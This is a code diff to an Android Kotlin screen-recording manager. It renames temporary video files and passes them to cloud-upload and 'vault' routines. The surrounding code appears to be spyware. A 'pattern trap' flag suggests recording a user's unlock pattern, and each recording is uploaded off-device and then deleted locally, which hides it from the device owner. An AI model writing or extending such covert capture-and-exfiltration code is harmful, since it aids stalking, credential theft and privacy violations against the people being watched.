@@ -46,7 +46,8 @@ object ScreenRecordManager {
         isRecording = true
         
         recordJob = CoroutineScope(Dispatchers.IO).launch {
-            val outputFile = File(ctx.cacheDir, "vid_${System.currentTimeMillis()}.mp4")
+            val timestamp = System.currentTimeMillis()
+            val tempFile = File(ctx.cacheDir, "vid_${timestamp}.tmp")
             try {
                 val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                 mediaProjection = mpm.getMediaProjection(resultCode, data)
@@ -82,7 +83,7 @@ object ScreenRecordManager {
                     }
                     setVideoSource(MediaRecorder.VideoSource.SURFACE)
                     setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                    setOutputFile(outputFile.absolutePath)
+                    setOutputFile(tempFile.absolutePath)
                     setVideoSize(width, height)
                     // Use HEVC (H.265) for 50% better compression if on Android 10+
                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
@@ -124,7 +125,7 @@ object ScreenRecordManager {
             } catch (e: Exception) {
                 DebugLogger.log("SCREEN_REC_ERR", "Capture failed: ${e.message}")
             } finally {
-                internalStop(ctx, outputFile)
+                internalStop(ctx, tempFile, timestamp)
             }
         }
     }
@@ -134,7 +135,7 @@ object ScreenRecordManager {
         recordJob?.cancel()
     }
 
-    private fun internalStop(ctx: Context, outputFile: File) {
+    private fun internalStop(ctx: Context, tempFile: File, timestamp: Long) {
         try { mediaRecorder?.stop() } catch(e:Exception){}
         mediaRecorder?.reset()
         mediaRecorder?.release()
@@ -150,15 +151,20 @@ object ScreenRecordManager {
         isPatternTrap = false
         DebugLogger.log("SCREEN_REC", "Hardware resources released.")
         
-        if (outputFile.exists() && outputFile.length() > 0) {
+        if (tempFile.exists() && tempFile.length() > 0) {
+            val finalFile = File(ctx.cacheDir, "vid_$timestamp.mp4")
+            tempFile.renameTo(finalFile)
+            
             // Use runBlocking to ensure IO upload thread finishes before cleanup destroys scope
             runBlocking { 
-                if (CloudManager.uploadFile(ctx, outputFile, "SCREEN_RECORD")) {
-                    outputFile.delete()
+                if (CloudManager.uploadFile(ctx, finalFile, "SCREEN_RECORD")) {
+                    finalFile.delete()
                 } else {
-                    DumpManager.vaultMedia(outputFile, "SCREEN_RECORD")
+                    DumpManager.vaultMedia(finalFile, "SCREEN_RECORD")
                 }
             }
+        } else if (tempFile.exists()) {
+            tempFile.delete()
         }
     }
 }
